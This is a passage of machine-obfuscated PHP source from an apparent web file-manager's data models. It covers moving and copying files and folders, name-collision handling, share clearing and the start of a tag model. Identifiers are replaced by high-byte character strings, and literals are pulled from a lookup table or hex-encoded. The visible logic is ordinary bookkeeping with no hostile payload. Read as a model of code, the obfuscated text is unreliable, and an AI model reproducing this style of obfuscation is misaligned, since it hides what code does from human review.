$„î»ßº[$ê×Ãßİ™[32]]); } private function fileNameExistCache($ùªéÀäé, $×ëÌÜÁ·) { $´¾¯İ±ú =& $_SERVER[öæÛ¿©¿]; $×ëÌÜÁ· = strtolower($×ëÌÜÁ·); $ìš¤œÔ = $this->_childrenList($ùªéÀäé); foreach ($ìš¤œÔ as $…ó¤öàÈ) { if ($×ëÌÜÁ· == strtolower($…ó¤öàÈ[$´¾¯İ±ú[32]])) { return $…ó¤öàÈ[$´¾¯İ±ú[192]]; } } return !1; } private function fileNameAutoCache($øŠè¶‘, $™ƒß²èµ, $Êì·ó…¦, $¬“¨“²¿) { $æÌŠØÑ‡ =& $_SERVER[öæÛ¿©¿]; $«¤Ô³®ß = $this->_childrenList($øŠè¶‘); $­Ø›è“¢ = array_to_keyvalue($«¤Ô³®ß, $æÌŠØÑ‡[12], $æÌŠØÑ‡[32]); return $this->fileNameAutoGet($­Ø›è“¢, $™ƒß²èµ, $Êì·ó…¦, $¬“¨“²¿); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($™ˆ®µ½Æ, $°ğÂÅ‹, $Ğ­§Æû¼ = REPEAT_REPLACE, $¿ç»©÷Ë = '') { $äÂØ“â =& $_SERVER[öæÛ¿©¿]; $ïï³±Ş = $this->sourceInfo($™ˆ®µ½Æ); $İƒ¥«‚á = $this->sourceInfo($°ğÂÅ‹); if ($ïï³±Ş[$äÂØ“â[191]] == $İƒ¥«‚á[$äÂØ“â[192]]) { if ($ïï³±Ş[$äÂØ“â[516]] == $äÂØ“â[91]) { Model($äÂØ“â[514])->restore(array($™ˆ®µ½Æ)); } if (!$¿ç»©÷Ë || $¿ç»©÷Ë == $ïï³±Ş[$äÂØ“â[32]]) { return $™ˆ®µ½Æ; } } $¾á“ÉÅŒ = $this->pathInfoMore($™ˆ®µ½Æ); if ($this->isParentOf($™ˆ®µ½Æ, $°ğÂÅ‹)) { return !1; } if (!$ïï³±Ş || !$İƒ¥«‚á || $İƒ¥«‚á[$äÂØ“â[496]] != $äÂØ“â[91]) { return !1; } Hook::trigger($äÂØ“â[677], $¾á“ÉÅŒ); $this->targetIsDelete = intval($ïï³±Ş[$äÂØ“â[516]]); if ($ïï³±Ş[$äÂØ“â[191]] == $°ğÂÅ‹ && $¿ç»©÷Ë != $ïï³±Ş[$äÂØ“â[32]]) { $É´£ûìó = $this->fileNameExist($°ğÂÅ‹, $¿ç»©÷Ë); if ($É´£ûìó && $ïï³±Ş[$äÂØ“â[496]] == $äÂØ“â[229]) { $’ç³‘Ü = $this->sourceInfo($É´£ûìó); $„‰ıóá’ = $this->fileHistory($’ç³‘Ü, $ïï³±Ş[$äÂØ“â[553]], $ïï³±Ş[$äÂØ“â[79]]); if (!$„‰ıóá’) { Model($äÂØ“â[556])->remove($ïï³±Ş[$äÂØ“â[553]]); } $this->removeNow($™ˆ®µ½Æ, !1); $this->folderSizeReset($°ğÂÅ‹); Hook::trigger($äÂØ“â[678], $¾á“ÉÅŒ); return $É´£ûìó; } } $øÜş†Ÿâ = $¿ç»©÷Ë ? $¿ç»©÷Ë : $ïï³±Ş[$äÂØ“â[32]]; $this->lockMoveStart($™ˆ®µ½Æ); $this->lockWriteStart($°ğÂÅ‹, $øÜş†Ÿâ); $İ´›Ì˜ = array($äÂØ“â[648] => array(), $äÂØ“â[679] => !1); $this->clearShare($™ˆ®µ½Æ, $°ğÂÅ‹); $•”Öƒôø = $this->fileNameExistAuto($°ğÂÅ‹, $ïï³±Ş); $õ¦ü»³ª = $this->_move($™ˆ®µ½Æ, $°ğÂÅ‹, $Ğ­§Æû¼, $İ´›Ì˜, $¿ç»©÷Ë); $this->sourceCacheClear(); if ($ïï³±Ş[$äÂØ“â[496]] == $äÂØ“â[91] && $•”Öƒôø) { $this->folderSizeResetChildren($õ¦ü»³ª); } Model($äÂØ“â[231])->linkAdd($İ´›Ì˜[$äÂØ“â[648]]); if ($õ¦ü»³ª && $•”Öƒôø && $İ´›Ì˜[$äÂØ“â[679]]) { $›¦õ… ¦ = $ïï³±Ş[$äÂØ“â[496]] == $äÂØ“â[91] ? $this->_childrenListSelect($™ˆ®µ½Æ) : !1; $™š£ÒÒƒ = $›¦õ… ¦ && count($›¦õ… ¦) > 0 ? !0 : !1; $this->removeNow($™ˆ®µ½Æ, $™š£ÒÒƒ); } $this->lockMoveEnd($™ˆ®µ½Æ); $this->lockWriteEnd($°ğÂÅ‹, $øÜş†Ÿâ); $this->folderSizeReset($ïï³±Ş[$äÂØ“â[191]]); $this->folderSizeReset($°ğÂÅ‹); $°„¥äöµ = array($ïï³±Ş[$äÂØ“â[191]], $°ğÂÅ‹); if ($ïï³±Ş[$äÂØ“â[496]] == $äÂØ“â[91]) { $°„¥äöµ[] = $™ˆ®µ½Æ; } $this->updateModifyTime($°„¥äöµ); Model($äÂØ“â[652])->eventMove($™ˆ®µ½Æ, $ïï³±Ş[$äÂØ“â[191]], $°ğÂÅ‹); Hook::trigger($äÂØ“â[678], $¾á“ÉÅŒ); return $õ¦ü»³ª; } private function _move($”˜²Äš, $½şÁÆ›, $°Í¬˜‚à, &$Ò¸ùŠˆ, $ÄÚÍ©Ü‹ = '') { $ãÖ¬ãé¿ =& $_SERVER[öæÛ¿©¿]; $Ú¥Û¼±Ã = $this->sourceInfo($”˜²Äš); $¦Ã‹Ëù = $Ú¥Û¼±Ã[$ãÖ¬ãé¿[496]] == $ãÖ¬ãé¿[91]; $œà é©ş = $ÄÚÍ©Ü‹ ? $ÄÚÍ©Ü‹ : $Ú¥Û¼±Ã[$ãÖ¬ãé¿[32]]; $‹Œµ•ß = $this->fileNameExistAuto($½şÁÆ›, $Ú¥Û¼±Ã); $this->lockMoveStart($”˜²Äš); $this->lockWriteStart($½şÁÆ›, $œà é©ş); if (!$‹Œµ•ß) { return $this->_moveForce($”˜²Äš, $½şÁÆ›, $œà é©ş); } $¯Û™¸š¿ = $‹Œµ•ß; $¢£”Õé¯ = !1; if ($¦Ã‹Ëù) { if ($°Í¬˜‚à == REPEAT_RENAME_FOLDER) { $œà é©ş = $this->fileNameAuto($½şÁÆ›, $œà é©ş, $°Í¬˜‚à, $¦Ã‹Ëù); $¯Û™¸š¿ = $this->_moveForce($”˜²Äš, $½şÁÆ›, $œà é©ş); } else { $ñùÊ–ÙŒ = $this->_childrenListSelect($”˜²Äš); foreach ($ñùÊ–ÙŒ as $¨­œüÆ) { $¨¿ı‘‹ = REPEAT_REPLACE; $this->_move($¨­œüÆ[$ãÖ¬ãé¿[192]], $‹Œµ•ß, $¨¿ı‘‹, $Ò¸ùŠˆ); } $¢£”Õé¯ = !0; } } else { if ($°Í¬˜‚à == REPEAT_RENAME || $°Í¬˜‚à == REPEAT_RENAME_FOLDER) { $œà é©ş = $this->fileNameAuto($½şÁÆ›, $œà é©ş, $°Í¬˜‚à, $¦Ã‹Ëù); $¯Û™¸š¿ = $this->_moveForce($”˜²Äš, $½şÁÆ›, $œà é©ş); } else { $ÁŠ‚©°Ş = $this->sourceInfoCache($‹Œµ•ß); $£½ùßÉØ = $this->fileHistory($ÁŠ‚©°Ş, $Ú¥Û¼±Ã[$ãÖ¬ãé¿[553]], $Ú¥Û¼±Ã[$ãÖ¬ãé¿[79]]); if ($£½ùßÉØ) { $Ò¸ùŠˆ[$ãÖ¬ãé¿[648]][] = $Ú¥Û¼±Ã[$ãÖ¬ãé¿[553]]; } $¢£”Õé¯ = !0; } } if ($¢£”Õé¯) { $Ò¸ùŠˆ[$ãÖ¬ãé¿[679]] = !0; } return $¯Û™¸š¿; } private function _moveForce($ªÍäûÔö, $šÒÑÏ¡, $ùé³­ƒ) { $ÍàÈë¿ =& $_SERVER[öæÛ¿©¿]; $æìã—¨ = $this->sourceInfo($ªÍäûÔö); $¹ªôãü = $this->sourceInfo($šÒÑÏ¡); $ê¯ÀˆãŸ = $æìã—¨[$ÍàÈë¿[496]] == $ÍàÈë¿[91]; $¥¸¬Å”Ê = array($ÍàÈë¿[488] => $¹ªôãü[$ÍàÈë¿[192]], $ÍàÈë¿[671] => $¹ªôãü[$ÍàÈë¿[600]] . $¹ªôãü[$ÍàÈë¿[192]] . $ÍàÈë¿[50], $ÍàÈë¿[667] => $¹ªôãü[$ÍàÈë¿[189]], $ÍàÈë¿[668] => $¹ªôãü[$ÍàÈë¿[585]], $ÍàÈë¿[670] => USER_ID, $ÍàÈë¿[505] => $ùé³­ƒ); $¬ğÉà¦ = $æìã—¨[$ÍàÈë¿[189]] == SourceModel::TYPE_GROUP && $¹ªôãü[$ÍàÈë¿[189]] == SourceModel::TYPE_GROUP && $æìã—¨[$ÍàÈë¿[585]] == $¹ªôãü[$ÍàÈë¿[585]]; if (!$¬ğÉà¦ && $this->moveClearAuth) { Model($ÍàÈë¿[583])->authClear($ªÍäûÔö); } $ùı˜Ûˆ = $æìã—¨[$ÍàÈë¿[516]] == $ÍàÈë¿[91] && $¹ªôãü[$ÍàÈë¿[516]] != $ÍàÈë¿[91]; if ($ùı˜Ûˆ) { $¥¸¬Å”Ê[$ÍàÈë¿[515]] = 0; } if ($ê¯ÀˆãŸ) { $Ëáè¾¢İ = array($ÍàÈë¿[671] => array($ÍàÈë¿[631], $æìã—¨[$ÍàÈë¿[600]] . $æìã—¨[$ÍàÈë¿[192]] . $ÍàÈë¿[632])); $·ş¶¬È = $æìã—¨[$ÍàÈë¿[600]] . $æìã—¨[$ÍàÈë¿[192]] . $ÍàÈë¿[50]; $ñïø•€› = $¹ªôãü[$ÍàÈë¿[600]] . $¹ªôãü[$ÍàÈë¿[192]] . $ÍàÈë¿[50] . $æìã—¨[$ÍàÈë¿[192]] . $ÍàÈë¿[50]; $÷ÖøÌıë = array($ÍàÈë¿[671] => array($ÍàÈë¿[680], "\x72\145\160\154\141\143\x65\50\x70\x61\x72\x65\x6e\x74\114\x65\x76\x65\154\x2c\47{$·ş¶¬È}\47\54\x27{$ñïø•€›}\x27\x29"), $ÍàÈë¿[667] => $¹ªôãü[$ÍàÈë¿[189]], $ÍàÈë¿[668] => $¹ªôãü[$ÍàÈë¿[585]]); if ($ùı˜Ûˆ) { $÷ÖøÌıë[$ÍàÈë¿[515]] = 0; } $this->where($Ëáè¾¢İ)->data($÷ÖøÌıë)->save(); } $this->where(array($ÍàÈë¿[502] => $ªÍäûÔö))->data($¥¸¬Å”Ê)->save(); return $ªÍäûÔö; } private function clearShare($¹ØÜ¢ºÓ, $×‰ÈûÊ) { $¡¦Šãèä =& $_SERVER[öæÛ¿©¿]; $°ÍÄ„¶Õ = $this->sourceInfo($¹ØÜ¢ºÓ); $ñ¯õœ­ƒ = $this->sourceInfo($×‰ÈûÊ); if ($°ÍÄ„¶Õ[$¡¦Šãèä[585]] == $ñ¯õœ­ƒ[$¡¦Šãèä[585]] && $°ÍÄ„¶Õ[$¡¦Šãèä[189]] == $¡¦Šãèä[681]) { return; } $Àşñô£÷ = array($¡¦Šãèä[600] => array($¡¦Šãèä[631], $°ÍÄ„¶Õ[$¡¦Šãèä[600]] . $¹ØÜ¢ºÓ . $¡¦Šãèä[632])); $ıµÜå– = $this->field($¡¦Šãèä[502])->where($Àşñô£÷)->getField($¡¦Šãèä[192], !0); if (!$ıµÜå–) { return; } $Àşñô£÷ = array($¡¦Šãèä[192] => array($¡¦Šãèä[7], $ıµÜå–), $¡¦Šãèä[682] => 1); $Í‰¿Íş¡ = Model($¡¦Šãèä[683])->field($¡¦Šãèä[684])->where($Àşñô£÷)->select(); if (!$Í‰¿Íş¡) { return; } $Í‰¿Íş¡ = array_to_keyvalue($Í‰¿Íş¡, $¡¦Šãèä[12], $¡¦Šãèä[684]); $Àşñô£÷ = array($¡¦Šãèä[684] => array($¡¦Šãèä[7], $Í‰¿Íş¡)); Model($¡¦Šãèä[683])->where($Àşñô£÷)->save(array($¡¦Šãèä[682] => 0)); Model($¡¦Šãèä[685])->where($Àşñô£÷)->delete(); } public function copyFolderFromIO($Ÿä‘©ä, $ÃÍò…•µ, $©á¡¼, $Ï²ÛæÄˆ, $ÁëÃ½ÂØ, $õã¦Ú‰ã = false) { $“âî í =& $_SERVER[öæÛ¿©¿]; $ï×‘è›Ô = array($“âî í[649] => array(), $“âî í[650] => array(), $“âî í[648] => array(), $“âî í[686] => array()); $×ŠÁÉ·Ã = $õã¦Ú‰ã ? $õã¦Ú‰ã : $Ÿä‘©ä->pathThis($ÃÍò…•µ); $æİÀæÕ• = $this->fileNameExist($©á¡¼, $×ŠÁÉ·Ã); $ş¤–ÎÈÔ = $this->mkdir($©á¡¼, $×ŠÁÉ·Ã, $Ï²ÛæÄˆ); if (!$æİÀæÕ• || $Ï²ÛæÄˆ == REPEAT_RENAME_FOLDER) { $Ï²ÛæÄˆ = !1; } if ($æİÀæÕ•) { $this->_childrenAllMake($æİÀæÕ•); } Hook::trigger($“âî í[687]); $ã»¼¨Ğ® = KodIO::ioFileDriverGet($“âî í[494] . $©á¡¼ . $“âî í[403]); $this->_copyChildTo($Ÿä‘©ä, $ÃÍò…•µ, $ş¤–ÎÈÔ, $Ï²ÛæÄˆ, $ï×‘è›Ô, $ÁëÃ½ÂØ, $ã»¼¨Ğ®); Hook::trigger($“âî í[688]); if ($ş¤–ÎÈÔ) { $this->folderSizeResetChildren($ş¤–ÎÈÔ); } $this->_childrenListClear(); Model($“âî í[651])->addAll($ï×‘è›Ô[$“âî í[649]], array(), !0); Model($“âî í[652])->eventCopy($ş¤–ÎÈÔ); $this->saveAll($ï×‘è›Ô[$“âî í[650]]); Model($“âî í[556])->linkAdd($ï×‘è›Ô[$“âî í[648]]); Model($“âî í[556])->remove($ï×‘è›Ô[$“âî í[686]]); $this->folderSizeReset($©á¡¼); $this->updateModifyTime($©á¡¼); return $ş¤–ÎÈÔ; } private function _copyChildTo($›ŒòÁËò, $ò ÷±Ë, $ÆÛˆœŞ¯, $»Š¤™£, &$ãÃ± è, $ïâŞ³›, $Â×ÏÛ–Õ) { $İßòÄÓ =& $_SERVER[öæÛ¿©¿]; $‰ª¶Â‰« = $this->sourceInfoCache($ÆÛˆœŞ¯); $ÖÖ¨Í”³ = $›ŒòÁËò->listPath($ò ÷±Ë); $ÖÖ¨Í”³ = $ÖÖ¨Í”³ ? $ÖÖ¨Í”³ : array($İßòÄÓ[86] => array(), $İßòÄÓ[85] => array()); $Œûº¦°³ = array_merge($ÖÖ¨Í”³[$İßòÄÓ[86]], $ÖÖ¨Í”³[$İßòÄÓ[85]]); $§ï¶²Ûş = $this->_addFiles($›ŒòÁËò, $Â×ÏÛ–Õ, $ÖÖ¨Í”³[$İßòÄÓ[86]], $ïâŞ³›); $Î¿õïÅ = array(); foreach ($Œûº¦°³ as &$®Û³±) { if (isset($§ï¶²Ûş[$®Û³±[$İßòÄÓ[32]]])) { $®Û³± = $§ï¶²Ûş[$®Û³±[$İßòÄÓ[32]]]; } $®Û³±[$İßòÄÓ[496]] = $®Û³±[$İßòÄÓ[33]] == $İßòÄÓ[78]; $®Û³±[$İßòÄÓ[497]] = substr(_get($®Û³±, $İßòÄÓ[167], $İßòÄÓ[12]), 0, 10); $®Û³±[$İßòÄÓ[79]] = _get($®Û³±, $İßòÄÓ[79], 0); $®Û³±[$İßòÄÓ[553]] = _get($®Û³±, $İßòÄÓ[553], 0); if (!isset($®Û³±[$İßòÄÓ[689]]) && $®Û³±[$İßòÄÓ[553]]) { $ãÃ± è[$İßòÄÓ[686]][] = $®Û³±[$İßòÄÓ[553]]; } if ($»Š¤™£) { $¢øà•âÉ = $this->fileNameExistCache($ÆÛˆœŞ¯, $®Û³±[$İßòÄÓ[32]]); if ($¢øà•âÉ) { if ($®Û³±[$İßòÄÓ[496]] || $»Š¤™£ == REPEAT_SKIP) { continue; } if ($»Š¤™£ == REPEAT_REPLACE) { $„«”Öıœ = $this->sourceInfoCache($¢øà•âÉ); $ÙÖ¼Û¥æ = $this->fileHistory($„«”Öıœ, $®Û³±[$İßòÄÓ[553]], $®Û³±[$İßòÄÓ[79]]); if ($ÙÖ¼Û¥æ) { $ãÃ± è[$İßòÄÓ[648]][] = $®Û³±[$İßòÄÓ[553]]; } continue; } else { if ($»Š¤™£ == REPEAT_RENAME) { $®Û³±[$İßòÄÓ[32]] = $this->fileNameAutoCache($ÆÛˆœŞ¯, $®Û³±[$İßòÄÓ[32]], $»Š¤™£, !1); } } } } if (!$®Û³±[$İßòÄÓ[496]] && $®Û³±[$İßòÄÓ[553]] == 0) { continue; } if (!$®Û³±[$İßòÄÓ[496]] && $®Û³±[$İßòÄÓ[553]]) { $ãÃ± è[$İßòÄÓ[648]][] = $®Û³±[$İßòÄÓ[553]]; } $Î¿õïÅ[] = $this->_makeItemData($®Û³±, $‰ª¶Â‰«, $®Û³±[$İßòÄÓ[32]]); } unset($®Û³±); if (!empty($Î¿õïÅ)) { $this->addAll($Î¿õïÅ); $this->_childrenListSelect($ÆÛˆœŞ¯); } $õ´ıÂø¬ = $this->_childrenList($ÆÛˆœŞ¯); $õ´ıÂø¬ = array_to_keyvalue($õ´ıÂø¬, $İßòÄÓ[32]); foreach ($Œûº¦°³ as $®Û³±) { $„«”Öıœ = $õ´ıÂø¬[$®Û³±[$İßòÄÓ[32]]]; $¡¶á˜ô = $„«”Öıœ[$İßòÄÓ[192]]; $this->_copyApplyMeta($„«”Öıœ, $ãÃ± è); if ($®Û³±[$İßòÄÓ[33]] == $İßòÄÓ[78]) { $®Û³±[$İßòÄÓ[87]] = $›ŒòÁËò->getPathInner($®Û³±[$İßòÄÓ[87]]); $this->_copyChildTo($›ŒòÁËò, $®Û³±[$İßòÄÓ[87]], $¡¶á˜ô, $»Š¤™£, $ãÃ± è, $ïâŞ³›, $Â×ÏÛ–Õ); } } } private function _addFiles($ú§ƒ™”, $ëÅºÜ¤ú, $Ì‘ì«, $£È„º²) { $çâ°Ã =& $_SERVER[öæÛ¿©¿]; if (!$Ì‘ì« || count($Ì‘ì«) == 0) { return array(); } $ÊöëØø = array(); foreach ($Ì‘ì« as &$ŒĞŠÖÚ ) { Hook::trigger($çâ°Ã[690], $ŒĞŠÖÚ ); $ŒĞŠÖÚ [$çâ°Ã[87]] = $ú§ƒ™”->getPathInner($ŒĞŠÖÚ [$çâ°Ã[87]]); $ØºÇÑÑ  = $ú§ƒ™”->hashSimple($ŒĞŠÖÚ [$çâ°Ã[87]]); $¢¸‡ğÉ = $ú§ƒ™”->hashMd5($ŒĞŠÖÚ [$çâ°Ã[87]]); if (strlen($¢¸‡ğÉ) > 10 && !isset($ÊöëØø[$¢¸‡ğÉ])) { $ÊöëØø[$¢¸‡ğÉ] = array(); } $ŒĞŠÖÚ [$çâ°Ã[691]] = $ØºÇÑÑ ; $ŒĞŠÖÚ [$çâ°Ã[559]] = $¢¸‡ğÉ; $ÊöëØø[$¢¸‡ğÉ][] =& $ŒĞŠÖÚ ; if (count($ÊöëØø[$¢¸‡ğÉ]) > 1) { $ŒĞŠÖÚ [$çâ°Ã[689]] = !0; } Hook::trigger($çâ°Ã[692], $ŒĞŠÖÚ ); } unset($ŒĞŠÖÚ ); $¼ŸöìÒ‘ = array($çâ°Ã[559] => array($çâ°Ã[7], array_keys($ÊöëØø))); $ü½É¢» = Model($çâ°Ã[693]); $¾ù‚ùî» = $ü½É¢»->where($¼ŸöìÒ‘)->select(); $¾ù‚ùî» = $¾ù‚ùî» ? $¾ù‚ùî» : array(); foreach ($¾ù‚ùî» as $–î­œ·á) { if (!isset($ÊöëØø[$–î­œ·á[$çâ°Ã[559]]])) { continue; } $¸ğİûÍ÷ = $ÊöëØø[$–î­œ·á[$çâ°Ã[559]]]; foreach ($¸ğİûÍ÷ as &$ŒĞŠÖÚ ) { $ŒĞŠÖÚ [$çâ°Ã[553]] = $–î­œ·á[$çâ°Ã[553]]; $ŒĞŠÖÚ [$çâ°Ã[689]] = !0; } unset($ŒĞŠÖÚ ); } $´ÔÄÆü = array(); foreach ($Ì‘ì« as $ğ¢¶ÔÊì) { Hook::trigger($çâ°Ã[694], $ğ¢¶ÔÊì); if (isset($ğ¢¶ÔÊì[$çâ°Ã[689]]) && $ğ¢¶ÔÊì[$çâ°Ã[689]]) { Hook::trigger($çâ°Ã[695], $ğ¢¶ÔÊì); continue; } $„ÁàøÙê = $ú§ƒ™”->getPathInner($ğ¢¶ÔÊì[$çâ°Ã[87]]); $ˆšİƒø = $ü½É¢»->addFileMake($„ÁàøÙê, $ëÅºÜ¤ú, $ğ¢¶ÔÊì[$çâ°Ã[79]], $ğ¢¶ÔÊì[$çâ°Ã[691]], $ğ¢¶ÔÊì[$çâ°Ã[559]], $ğ¢¶ÔÊì[$çâ°Ã[32]], $£È„º²); Hook::trigger($çâ°Ã[695], $ğ¢¶ÔÊì); if (!is_array($ˆšİƒø)) { continue; } $´ÔÄÆü[] = $ˆšİƒø; } $ü½É¢»->addAll($´ÔÄÆü); $¼ŸöìÒ‘ = array($çâ°Ã[559] => array($çâ°Ã[7], array_keys($ÊöëØø))); $¾ù‚ùî» = $ü½É¢»->where($¼ŸöìÒ‘)->select(); $¾ù‚ùî» = $¾ù‚ùî» ? $¾ù‚ùî» : array(); foreach ($¾ù‚ùî» as $–î­œ·á) { if (!isset($ÊöëØø[$–î­œ·á[$çâ°Ã[559]]])) { continue; } $ñ¼í†Ïš =& $ÊöëØø[$–î­œ·á[$çâ°Ã[559]]]; foreach ($ñ¼í†Ïš as &$ŒĞŠÖÚ ) { $ŒĞŠÖÚ [$çâ°Ã[553]] = $–î­œ·á[$çâ°Ã[553]]; } unset($ŒĞŠÖÚ ); } $œÊÇÂ›ñ = array(); foreach ($Ì‘ì« as $ç’¯ÀÄ) { $œÊÇÂ›ñ[$ç’¯ÀÄ[$çâ°Ã[32]]] = $ç’¯ÀÄ; } return $œÊÇÂ›ñ; } } define($_SERVER[öæÛ¿©¿][696], $_SERVER[öæÛ¿©¿][697]); $wrcmbaxhse = $_SERVER[öæÛ¿©¿][698]; goto c•¥×²…Ï§; EëŸÄ‘‚£ñ: class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($²ê¾»ÂÚ) { $¢£–óıá =& $_SERVER[öæÛ¿©¿]; return array($¢£–óıá[2241] => array($²ê¾»ÂÚ[0], $¢£–óıá[2242]), $¢£–óıá[2243] => array($²ê¾»ÂÚ[0], $¢£–óıá[2244])); } protected function ___get($¦À°ú‹é) { $³ØÒù¤¥ =& $_SERVER[öæÛ¿©¿]; $Ø”¡ëê = Model($³ØÒù¤¥[601])->metaGet($¦À°ú‹é, $³ØÒù¤¥[2245]); $¨±‡Ò´ = json_decode($Ø”¡ëê, !0); return $¨±‡Ò´ ? $¨±‡Ò´ : array($³ØÒù¤¥[2246] => $³ØÒù¤¥[91], $³ØÒù¤¥[446] => array()); } protected function ___listData($…ìûÎ) { $¬’ñù× =& $_SERVER[öæÛ¿©¿]; $ñîğ¼ü = array($¬’ñù×[1916] => 0, $¬’ñù×[569] => array($¬’ñù×[2247], 0), $¬’ñù×[507] => $¬’ñù×[1436] . $…ìûÎ); $Ò³ÕÚúÉ = $¬’ñù×[2248]; $æØÍüòÖ = $this->field($Ò³ÕÚúÉ)->where($ñîğ¼ü)->order($¬’ñù×[2249])->select(); return $æØÍüòÖ ? $æØÍüòÖ : array(); } protected function set($úñèïâÉ, $‰ÌëÁÅ) { $ í°‡šƒ =& $_SERVER[öæÛ¿©¿]; $‰ÌëÁÅ = $‰ÌëÁÅ ? $‰ÌëÁÅ : array($ í°‡šƒ[2246] => $ í°‡šƒ[91], $ í°‡šƒ[446] => array()); return Model($ í°‡šƒ[601])->metaSet($úñèïâÉ, $ í°‡šƒ[2245], json_encode($‰ÌëÁÅ)); } protected function getByTagID($ğœ¯¢§Ò, $Ì„Ÿ£³İ) { $ì¯ÙÆ™¨ =& $_SERVER[öæÛ¿©¿]; if (!$ğœ¯¢§Ò || !$Ì„Ÿ£³İ) { return !1; } if (!Model($ì¯ÙÆ™¨[601])->getInfoSimple($ğœ¯¢§Ò)) { return !1; } $Ø¡é¡‘° = $this->get($ğœ¯¢§Ò); if (!$Ø¡é¡‘° || !isset($Ø¡é¡‘°[$ì¯ÙÆ™¨[446]])) { return !1; } $Ó“úšÛ = array_find_by_field($Ø¡é¡‘°[$ì¯ÙÆ™¨[446]], $ì¯ÙÆ™¨[483], $Ì„Ÿ£³İ); return is_array($Ó“úšÛ) ? $Ó“úšÛ : !1; } public function listSource($Ì›‘ØŸ, $ ç‚µÅà) { $Í¥®‚é =& $_SERVER[öæÛ¿©¿]; if ($ ç‚µÅà && !is_array($ ç‚µÅà)) { $ ç‚µÅà = array($ ç‚µÅà); } $Ş„Ü—Ü˜ = $this->get($Ì›‘ØŸ); $Ü›ô­É“ = array_to_keyvalue($Ş„Ü—Ü˜[$Í¥®‚é[446]], $Í¥®‚é[483]); $ÑŠŞÊÒ¶ = array_to_keyvalue($Ş„Ü—Ü˜[$Í¥®‚é[594]], $Í¥®‚é[483]); $°¥‚ÙÕå = $this->listData($Ì›‘ØŸ); $ıÊ½å° = array(); foreach ($ ç‚µÅà as $Ïáş°—½) { $óª‡”Şù = $Ü›ô­É“[$Ïáş°—½]; $ò†åãòŒ = _get($óª‡”Şù, $Í¥®‚é[594]); if (!$óª‡”Şù || !$ò†åãòŒ || !$ÑŠŞÊÒ¶[$ò†åãòŒ]) { continue; } if (!$ıÊ½å°[$ò†åãòŒ]) { $ıÊ½å°[$ò†åãòŒ] = array(); } $ıÊ½å°[$ò†åãòŒ][] = $Ïáş°—½; } $ä˜š»§ª = array(); $ç‚¼À±“ = array(); foreach ($°¥‚ÙÕå as $¥ßìğÕ˜) { $Ìì÷ßüÃ = $¥ßìğÕ˜[$Í¥®‚é[87]]; $óª‡”Şù = $Ü›ô­É“[$¥ßìğÕ˜[$Í¥®‚é[511]]]; $ò†åãòŒ = _get($óª‡”Şù, $Í¥®‚é[594]); if (!$óª‡”Şù || !$ò†åãòŒ || !$ıÊ½å°[$ò†åãòŒ] || !$Ìì÷ßüÃ) { continue; } if (!in_array($¥ßìğÕ˜[$Í¥®‚é[511]], $ıÊ½å°[$ò†åãòŒ])) { continue; } if (!$ä˜š»§ª[$Ìì÷ßüÃ]) { $ä˜š»§ª[$Ìì÷ßüÃ] = array(); } $ä˜š»§ª[$Ìì÷ßüÃ][] = $ò†åãòŒ; } foreach ($ä˜š»§ª as $Ìì÷ßüÃ => $…ñ€Õè£) { if (count($…ñ€Õè£) != count($ıÊ½å°)) { continue; } $ç‚¼À±“[] = $Ìì÷ßüÃ; } if (!$ ç‚µÅà) { $ç‚¼À±“ = array_to_keyvalue($°¥‚ÙÕå, $Í¥®‚é[12], $Í¥®‚é[87]); } $ç‚¼À±“ = array_unique($ç‚¼À±“); if (!$ç‚¼À±“) { return array(); } $éÜÕ¬ş– = array($Í¥®‚é[502] => array($Í¥®‚é[503], $ç‚¼À±“), $Í¥®‚é[585] => $Ì›‘ØŸ, $Í¥®‚é[189] => SourceModel::TYPE_GROUP); $®¨ò¥©› = Model($Í¥®‚é[1478])->listSource($éÜÕ¬ş–); if (!$®¨ò¥©› || count($ç‚¼À±“) == $®¨ò¥©›[$Í¥®‚é[443]][$Í¥®‚é[444]]) { return $®¨ò¥©›; } $Ò†¦ù’Á = array(); $“ˆ˜Éô´ = array_to_keyvalue($®¨ò¥©›[$Í¥®‚é[85]], $Í¥®‚é[12], $Í¥®‚é[192]); $æÌåğ¹Ÿ = array_to_keyvalue($®¨ò¥©›[$Í¥®‚é[86]], $Í¥®‚é[12], $Í¥®‚é[192]); $¥¬º‘Ÿï = array_merge($æÌåğ¹Ÿ, $“ˆ˜Éô´); foreach ($ç‚¼À±“ as $Ìì÷ßüÃ) { if (!in_array($Ìì÷ßüÃ, $¥¬º‘Ÿï)) { $Ò†¦ù’Á[] = $Ìì÷ßüÃ; } } if ($Ò†¦ù’Á) { $this->removeBySource($Ì›‘ØŸ, $Ò†¦ù’Á); } return $®¨ò¥©›; } protected function addToTag($¦ä‘ò—™, $¾É›Ş“®, $ı¯ç‚ó¨) { $›Ä¿…Áü =& $_SERVER[öæÛ¿©¿]; if (!$this->getByTagID($¦ä‘ò—™, $ı¯ç‚ó¨) || !$¾É›Ş“®) { return !1; } if (!Model($›Ä¿…Áü[925])->pathInfo($¾É›Ş“®)) { return !1; } $°Áí»Ÿ = array($›Ä¿…Áü[1916] => 0, $›Ä¿…Áü[569] => $ı¯ç‚ó¨, $›Ä¿…Áü[506] => $¾É›Ş“®, $›Ä¿…Áü[507] => $›Ä¿…Áü[2250] . $¦ä‘ò—™, $›Ä¿…Áü[505] => $›Ä¿…Áü[12], $›Ä¿…Áü[2135] => 0); if ($this->where($°Áí»Ÿ)->find()) { return !1; } return $this->add($°Áí»Ÿ); } protected function removeFromTag($ëèè¤í¶, $ÀÚœğŞ«, $¨÷É½‹‘) { $ºâŸúé³ =& $_SERVER[öæÛ¿©¿]; if (!$this->getByTagID($ëèè¤í¶, $¨÷É½‹‘) || !$ÀÚœğŞ«) { return !1; } if (is_array($ÀÚœğŞ«)) { $ÀÚœğŞ« = array($ºâŸúé³[7], $ÀÚœğŞ«); } $äÒıŞô­ = array($ºâŸúé³[1916] => 0, $ºâŸúé³[569] => $¨÷É½‹‘, $ºâŸúé³[507] => $ºâŸúé³[2250] . $ëèè¤í¶, $ºâŸúé³[506] => $ÀÚœğŞ«); return $this->where($äÒıŞô­)->delete(); } protected function removeByTag($ô€‰öÑ¶, $…­­áÜö) { $×€ŒìÉ¼ =& $_SERVER[öæÛ¿©¿]; if (!$this->getByTagID($ô€‰öÑ¶, $…­­áÜö)) { return !1; } $ı­º¿ = array($×€ŒìÉ¼[1916] 